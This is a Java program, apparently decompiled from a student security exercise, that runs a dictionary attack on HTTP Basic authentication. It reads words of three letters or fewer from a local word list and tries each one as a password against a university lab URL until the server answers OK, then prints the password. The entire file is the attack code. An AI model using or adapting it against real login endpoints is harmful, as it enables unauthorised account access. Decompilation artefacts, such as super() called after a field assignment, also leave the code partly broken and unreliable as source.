public class Dictionary {
    boolean connected;
    int counter;
    java.util.Vector words;
    Dictionary() {
        super();
        this.connected = false;
        this.words = new java.util.Vector();
        this.counter = 0;
        this.readWords();
        this.startAttack();
    }
    public void startAttack() {
        while ( this.counter < this.words.size() ) {
            this.connected = this.sendRequest();
            if ( this.connected ) {
                System.out.print ( "The password is: " );
                System.out.println ( ( String ) this.words.elementAt ( this.counter - 1 ) );
                this.counter = this.words.size();
            }
        }
    }
    public void readWords() {
        try {
            java.io.BufferedReader a = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.FileReader ( "/usr/share/lib/dict/words" ) );
            String s = a.readLine();
            while ( s != null ) {
                if ( s.length() <= 3 ) {
                    this.words.addElement ( ( Object ) s );
                }
                s = a.readLine();
            }
        } catch ( java.io.IOException ignoredException ) {
        }
    }
    public boolean sendRequest() {
        java.net.Authenticator.setDefault ( ( java.net.Authenticator ) new Dictionary$MyAuthenticator ( this ) );
        try {
            java.net.HttpURLConnection a = ( java.net.HttpURLConnection ) new java.net.URL ( "http://sec-crack.cs.rmit.edu./SEC/2/" ).openConnection();
            a.connect();
            if ( a.getResponseMessage().equalsIgnoreCase ( "OK" ) ) {
                return true;
            }
        } catch ( java.io.IOException ignoredException ) {
        }
        return false;
    }
    public static void main ( String[] a ) {
        Dictionary a0 = new Dictionary();
    }
}
class Dictionary$MyAuthenticator extends java.net.Authenticator {
    final Dictionary this$0;
    Dictionary$MyAuthenticator ( Dictionary a ) {
        this.this$0 = a;
        super();
    }
    protected java.net.PasswordAuthentication getPasswordAuthentication() {
        String s = ( String ) this.this$0.words.elementAt ( this.this$0.counter );
        Dictionary a = this.this$0;
        a.counter = a.counter + 1;
        return new java.net.PasswordAuthentication ( "", s.toCharArray() );
    }
}
